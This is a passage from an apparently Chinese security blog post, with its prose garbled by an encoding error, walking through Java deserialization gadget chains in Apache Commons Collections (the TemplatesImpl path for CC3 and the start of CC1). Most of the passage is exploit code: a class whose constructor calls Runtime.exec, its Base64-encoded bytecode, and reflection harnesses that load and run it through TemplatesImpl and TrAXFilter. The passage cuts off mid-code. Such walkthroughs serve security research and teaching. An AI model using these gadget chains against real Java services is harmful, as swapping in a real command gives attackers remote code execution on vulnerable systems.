<span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//å…³é”®æ–¹æ³•ï¼šnewTransformer()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"><span class="comment">// å…³é”®ç‚¹ï¼Œè°ƒç”¨ getTransletInstance()</span></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(),</span><br><span class="line">                _outputProperties,</span><br><span class="line">                _indentNumber, _tfactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç»§ç»­è·Ÿè¿› getTransletInstance() æ–¹æ³•ï¼š</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//å…ˆåˆ¤æ–­æ˜¯å¦ä¸º nullï¼Œå¦‚æœä¸º null çš„è¯å»åŠ è½½å­—èŠ‚ç ï¼Œç´§æ¥ç€ newInstance() å¯¹å…¶</span></span><br><span class="line">            å®ä¾‹åŒ–ã€‚</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].newInstance();</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»§ç»­è·Ÿè¿› defineTransletClasses() æ–¹æ³•:</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">                            <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">        _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»§ç»­è·Ÿè¿› TransletClassLoaderï¼Œè¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶æ„å­—èŠ‚ç çš„ç”Ÿæˆï¼š</p><p>HelloTemplatesImpl.javaï¼Œä¸»è¦å…¶å¿…é¡»ç»§æ‰¿ AbstractTranslet ç±»ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸º HelloTemplatesImpl.classï¼Œç„¶åè¿›è¡Œ Base64 ç¼–ç ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL<span class="regexp">/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/</span>AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj</span><br></pre></td></tr></table></figure><p>æµ‹è¯• TemplatesImplï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€ä¼ å…¥æ¶æ„å­—èŠ‚ç ç»™ TemplatesImplï¼Œç„¶åè°ƒç”¨å…¶ newTransformer æ–¹æ³•ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ç±»å¯ä»¥è°ƒç”¨ TemplatesImpl.newTransformer()ï¼Œè¿™é‡Œå…ˆä»‹ç»ä¸€ä¸ªæ„é€  CC3 ä¸­å°†ä¼šç”¨åˆ°çš„ç±» TrAXFilterï¼Œä¸‹é¢æ˜¯å…¶æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span></span><br><span class="line">            TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">//å…³é”®ç‚¹</span></span><br><span class="line">â€¦â€¦â€¦â€¦</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯• TrAXFilterï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• TrAXFilter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">        <span class="comment">//åå°„è®¾ç½® Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><h2 id="CC1">CC1</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt="image-20240401225549195">image-20240401225549195</p><h3 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h3><p>jdkä¸º8u65</p><h3 id="InvokerTransformer-transform">InvokerTransformer.transform</h3><p>CC1æ¼æ´ç‚¹åœ¨ InvokerTransformer</p><p>InvokerTransformer</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401232841292.png" alt="image-20240401232841292"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»çš„ transform æ–¹æ³•ä¸­æœ‰ä»»æ„æ–¹æ³•è°ƒç”¨</p><p>åšä¸ª demo</p><p>å…ˆç”¨åå°„è°ƒç”¨å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span 